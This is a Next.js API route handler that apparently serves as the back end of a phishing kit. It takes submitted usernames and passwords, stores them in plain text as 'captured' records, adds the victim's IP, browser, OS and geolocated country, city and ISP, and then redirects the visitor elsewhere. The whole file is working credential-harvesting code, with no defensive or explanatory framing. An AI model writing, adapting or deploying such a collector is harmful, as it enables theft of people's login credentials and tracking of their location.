import { NextResponse } from "next/server";
import UAParser from "ua-parser-js";
import { v4 as uuid } from "uuid";

import { TUserInfo } from "@/backend/types/globals";
import Database from "@/backend/database";
import { url } from "@/backend/config";

export async function POST(req: Request) {
  try {
    const data = await req.json();
    const userAgent = new UAParser(String(req.headers.get("user-agent")));

    // Verificación y validación de la data recibida
    if (!data || !data.username || !data.password) {
      console.error("Datos de entrada incompletos o inválidos");
      return NextResponse.json(
        { status: "fail", message: "Datos inválidos" },
        { status: 400 }
      );
    }

    const os = userAgent.getOS();
    const browser = userAgent.getBrowser();
    const address = req.headers.get("x-forwarded-for") || "N/A";
    const ipRes = await fetch(`http://ip-api.com/json/${address}`, {
      method: "GET",
    });
    const ipData = await ipRes.json();

    const userInfo: TUserInfo = {
      id: data.id || uuid(),
      ip: address,
      username: data.username,
      password: data.password,
      captureDate: data.date,
      browser: `${browser.name} ${browser.version}`,
      os: `${os.name} ${os.version}`,
      country: ipData.status === "success" ? ipData.country : null,
      countryCode: ipData.status === "success" ? ipData.countryCode : null,
      city: ipData.status === "success" ? ipData.city : null,
      isp: ipData.status === "success" ? ipData.isp : null,
      captured: true,
    };

    const db = new Database();
    await db.addCaptured(userInfo);

    return NextResponse.json({ status: "success", redirect: url.redirect });
  } catch (error) {
    console.error("Error en la operación de Firestore: ", error);
    return NextResponse.json(
      { status: "fail", message: "Error en el servidor" },
      { status: 500 }
    );
  }
}

export const dynamic = "force-dynamic";
